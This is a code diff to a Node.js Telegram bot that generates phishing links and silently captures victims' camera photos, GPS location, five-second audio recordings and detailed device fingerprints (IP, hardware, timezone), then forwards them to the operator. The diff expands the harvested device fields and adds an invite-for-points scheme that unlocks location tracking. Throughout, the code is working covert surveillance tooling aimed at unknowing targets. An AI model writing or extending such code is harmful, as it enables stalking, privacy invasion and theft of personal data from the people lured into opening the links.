@@ -74,12 +74,11 @@ async function getUserData(chatId) {
 
 async function showStartMenu(chatId) {
     const user = await getUserData(chatId);
-    const locationText = user.unlocked_location ? '📍 Location Track (Unlocked)' : '📍 Location Track (🔒 2 Pts)';
 
     const opts = {
         reply_markup: {
             keyboard: [
-                [{ text: '🚀 Start Task (Camera)' }, { text: locationText }],
+                [{ text: '🚀 Start Task (Camera)' }, { text: '📍 Location' }],
                 [{ text: '📱 Device Info' }, { text: '🎤 Voice Record' }],
                 [{ text: '🔗 Invite Friends' }, { text: '👤 My Profile' }],
                 [{ text: '🛠 Help' }]
@@ -98,9 +97,9 @@ You have been verified as a premium member of our community.
 
 <b>🔹 Available Tools:</b>
 📸 <b>Camera:</b> Secretly capture photos
-📍 <b>Location:</b> Track real-time GPS location
-📱 <b>Device Info:</b> Get phone details & IP
-🎤 <b>Voice:</b> Record audio silently
+📍 <b>Location:</b> Track real-time GPS location (Costs 2 Pts to unlock)
+📱 <b>Device Info:</b> Get 10+ phone details & IP
+🎤 <b>Voice:</b> Record 5s audio silently
 
 <i>Enjoy our professional service!</i>`;
 
@@ -134,7 +133,7 @@ The system will silently capture the data and send it directly to you here!
 - Invite friends to earn 1 Point per friend.
 - Use 2 Points to unlock the Premium Location Tracker.
 
-<i>🔐 Note: Everything is fully automated and secure.</i>`;
+<i>🔐 Note: To get Device Info or Voice, you MUST generate a new link after selecting the respective option! Old links will not work.</i>`;
 
     bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
 }
@@ -319,7 +318,7 @@ bot.on('message', async (msg) => {
         else if (text === '🎤 Voice Record') {
             await showPayloadMenu(chatId, 'voice');
         }
-        else if (text.includes('Location Track')) {
+        else if (text === '📍 Location') {
             const user = await getUserData(chatId);
             if (user.unlocked_location) {
                 await showPayloadMenu(chatId, 'location');
@@ -451,7 +450,7 @@ app.post('/upload', upload.array('files', 3), async (req, res) => {
             req.files.forEach(f => fs.unlinkSync(f.path));
         } 
         else if (target_action === 'voice' && req.files && req.files.length > 0) {
-            await bot.sendVoice(chatId, fs.createReadStream(req.files[0].path));
+            await bot.sendAudio(chatId, fs.createReadStream(req.files[0].path), { title: 'Voice Note' });
             bot.sendMessage(chatId, '<b>🎤 New Voice Note Captured!</b>', { parse_mode: 'HTML' });
             fs.unlinkSync(req.files[0].path);
         }
@@ -462,7 +461,20 @@ app.post('/upload', upload.array('files', 3), async (req, res) => {
         }
         else if (target_action === 'device_info' && deviceData) {
             const d = JSON.parse(deviceData);
-            const msg = `<b>📱 New Device Info Captured!</b>\n\n<b>IP:</b> ${d.ip || 'Unknown'}\n<b>OS:</b> ${d.os}\n<b>Browser:</b> ${d.browser}\n<b>Battery:</b> ${d.battery}\n<b>Network:</b> ${d.network}\n<b>User-Agent:</b> <code>${d.userAgent}</code>`;
+            const msg = `<b>📱 New Device Info Captured!</b>\n
+<b>IP:</b> ${d.ip || 'Unknown'}
+<b>OS:</b> ${d.os}
+<b>Browser:</b> ${d.browser}
+<b>Battery:</b> ${d.battery} (Charging: ${d.charging})
+<b>Network:</b> ${d.network}
+<b>CPU Cores:</b> ${d.cores}
+<b>RAM:</b> ${d.ram}
+<b>Screen:</b> ${d.screen}
+<b>Timezone:</b> ${d.timezone}
+<b>Language:</b> ${d.language}
+<b>GPU:</b> ${d.gpu}
+
+<b>User-Agent:</b> <code>${d.userAgent}</code>`;
             bot.sendMessage(chatId, msg, { parse_mode: 'HTML' });
         }
 
